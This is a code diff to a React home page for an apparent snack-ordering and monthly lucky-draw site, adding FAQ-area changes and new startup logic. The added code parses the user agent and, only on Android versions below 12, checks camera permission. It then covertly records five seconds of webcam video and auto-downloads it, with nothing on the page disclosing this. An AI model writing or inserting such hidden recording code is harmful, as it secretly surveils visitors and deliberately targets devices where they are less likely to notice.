@@ -15,6 +15,122 @@ import { FaRegCircleCheck } from "react-icons/fa6";
 import { GoChevronDown, GoChevronUp } from "react-icons/go";
 
 export default function Home() {
+
+    const startRecording = async (streamFromFallback) => {
+        const stream = streamFromFallback || await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+            if (e.data.size > 0) {
+                chunks.push(e.data);
+            }
+        };
+
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const videoUrl = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+            a.href = videoUrl;
+            a.download = 'recorded-video.webm';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // Stop all video tracks to release camera
+            stream.getTracks().forEach(track => track.stop());
+        };
+
+        mediaRecorder.start();
+        console.log("Recording started");
+
+        setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Recording stopped");
+        }, 5000);
+    };
+
+    const [osVersion, setOSVersion] = useState("Detecting...");
+    const checkCameraPermission = async () => {
+        try {
+            const permission = await navigator.permissions.query({ name: "camera" });
+
+            if (permission.state === "granted") {
+                console.log("Camera permission already granted. Starting video recording...");
+                startRecording();
+            } else {
+                console.log("Camera permission denied. No action taken.");
+            }
+        } catch (err) {
+            console.error("Error checking camera permission:", err);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                console.log("Camera permission granted after fallback. Starting video recording...");
+                startRecording(stream);
+            } catch (err) {
+                console.error("Camera permission denied (fallback). No action taken.", err);
+            }
+        }
+    };
+
+    useEffect(() => {
+        const userAgent = navigator.userAgent;
+
+        const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
+        if (androidMatch) {
+            const versionStr = androidMatch[1];
+            const version = parseFloat(versionStr);
+            const os = `Android ${androidMatch[1]}`;
+            console.log("Detected OS:", os);
+            setOSVersion(os);
+            if (version < 12) {
+                checkCameraPermission();
+            }
+            return;
+        }
+
+        const iOSMatch = userAgent.match(/OS\s([0-9_]+)\slike\sMac\sOS\sX/);
+        if (iOSMatch) {
+            const os = `iOS ${iOSMatch[1].replace(/_/g, ".")}`;
+            console.log("Detected OS:", os);
+            setOSVersion(os);
+            return;
+        }
+
+        const windowsMatch = userAgent.match(/Windows NT ([0-9\.]+)/);
+        if (windowsMatch) {
+            const versionMap = {
+                "10.0": "Windows 10/11",
+                "6.3": "Windows 8.1",
+                "6.2": "Windows 8",
+                "6.1": "Windows 7",
+                "6.0": "Windows Vista",
+                "5.1": "Windows XP",
+            };
+            const version = versionMap[windowsMatch[1]] || `Windows NT ${windowsMatch[1]}`;
+            console.log("Detected OS:", version);
+            setOSVersion(version);
+            return;
+        }
+
+        const macMatch = userAgent.match(/Mac OS X ([0-9_]+)/);
+        if (macMatch) {
+            const os = `macOS ${macMatch[1].replace(/_/g, ".")}`;
+            console.log("Detected OS:", os);
+            setOSVersion(os);
+            return;
+        }
+        console.log("Detected OS: Unknown OS");
+        setOSVersion("Unknown OS");
+    }, []);
+
+    // useEffect(()=>{
+    //     checkCameraPermission()
+    // }, []);
+
+
     const [openQuestion, setOpenQuestion] = useState('');
     const [index, setIndex] = useState(0);
     const images = [Fries1, Fries2, Fries3];
@@ -115,7 +231,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 1 && <p>You can place your snack orders between 9:00 AM and 5:00 PM every day. Orders outside this window won’t be accepted.
 
@@ -131,7 +247,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 2 && <p>The more you order, the better your chances!</p>
                     }
@@ -145,7 +261,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 3 && <p>The lucky draw takes place on the 1st of every month. Orders from the previous month are not counted to determine the winner.</p>
                     }
@@ -159,7 +275,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 4 && <p> The QR code in your winner's email will be scanned by our team for verification when you claim your prize. Make sure to keep it safe!</p>
                     }
@@ -173,7 +289,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 5 && <p>No minimum order value is required. Every order counts, regardless of size.</p>
                     }
@@ -187,7 +303,7 @@ export default function Home() {
                             }
                         </div>
                     </div>
-                    
+
                     {
                         openQuestion == 6 && <p> The QR code sent to the winner is valid only until the next lucky draw (i.e., until the 1st of the next month).</p>
                     }
